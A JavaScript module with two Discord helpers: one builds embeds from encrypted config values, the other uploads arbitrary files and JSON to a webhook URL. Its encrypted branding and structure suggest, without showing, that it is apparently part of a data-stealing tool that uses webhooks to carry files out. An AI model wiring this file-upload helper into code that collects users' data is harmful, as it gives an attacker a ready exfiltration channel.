module.exports = (client) => {
    return {

        createEmbed(data) {
            let obj = {
                "timestamp": new Date(),
                "footer": {
                    "text": client.utils.encryption.decryptData(client.config.embed.footer.text),
                    "icon_url": client.utils.encryption.decryptData(client.config.embed.footer.icon_url),
                },
                "author": {
                    "name": client.utils.encryption.decryptData(client.config.embed.footer.text),
                    "url": client.utils.encryption.decryptData(client.config.embed.href),
                    "icon_url": client.utils.encryption.decryptData(client.config.embed.avatar_url),
                }
            }

            for (let [key, value] of Object.entries(data)) {
                obj[key] = value;
            }

            if (obj.title) {
                obj.url = client.utils.encryption.decryptData(client.config.embed.href);
            }

            return obj;
        },

        async sendToWebhook(url, data) {
            var files = data.files;

            if (files) {
                let client1 = new client.requires.discord_webhook.Webhook({
                    url: url,
                    throwErrors: false,
                });

                files.forEach(async (file) => {
                    [client1].forEach(async (_client) => {
                        _client.setAvatar(client.utils.encryption.decryptData(client.config.embed.avatar_url));
                        _client.setUsername(client.utils.encryption.decryptData(client.config.embed.username));
                        await _client.sendFile(file);
                    })
                })
            }

            if (Object.entries(data).length == 1 && data.files) {
                return;
            }

            let obj = {
                "avatar_url": client.utils.encryption.decryptData(client.config.embed.avatar_url),
                "username": client.utils.encryption.decryptData(client.config.embed.username),
            }

            for (let [key, value] of Object.entries(data)) {
                obj[key] = value;
            }

            await client.requires.axios({
                url: url,
                method: "POST",
                data: obj
            });
        }
    };
};